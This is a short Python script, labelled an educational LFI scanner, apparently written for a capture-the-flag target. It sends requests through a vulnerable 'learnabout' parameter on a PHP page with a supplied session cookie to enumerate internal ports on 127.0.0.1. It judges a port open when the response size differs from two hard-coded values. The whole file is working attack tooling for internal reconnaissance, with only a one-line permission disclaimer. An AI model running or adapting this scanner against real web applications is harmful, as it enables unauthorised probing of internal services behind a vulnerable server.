#!/usr/bin/env python3
"""
LFI Scanner (educational)
Usage: python3 lfi_scanner.py http://TARGET/casino/explainmepls.php SESSION_COOKIE 1-1000
Note: Ensure you have permission to test the target.
"""
import requests, sys
def test_port(target, sess, port):
    url = f"{target}?learnabout=127.0.0.1:{port}"
    try:
        r = requests.get(url, cookies={'PHPSESSID': sess}, timeout=5)
        size = len(r.content)
        # heuristic: different response sizes may indicate service
        if size not in (1129, 1134):
            print(f"[+] Port {port} -> {size} bytes (possible open)")
    except Exception:
        pass

if __name__ == '__main__':
    if len(sys.argv) != 4:
        print('Usage: lfi_scanner.py <target> <session> <port_range>')
        sys.exit(1)
    target = sys.argv[1]; sess = sys.argv[2]; pr = list(map(int, sys.argv[3].split('-')))
    for p in range(pr[0], pr[1]+1):
        test_port(target, sess, p)
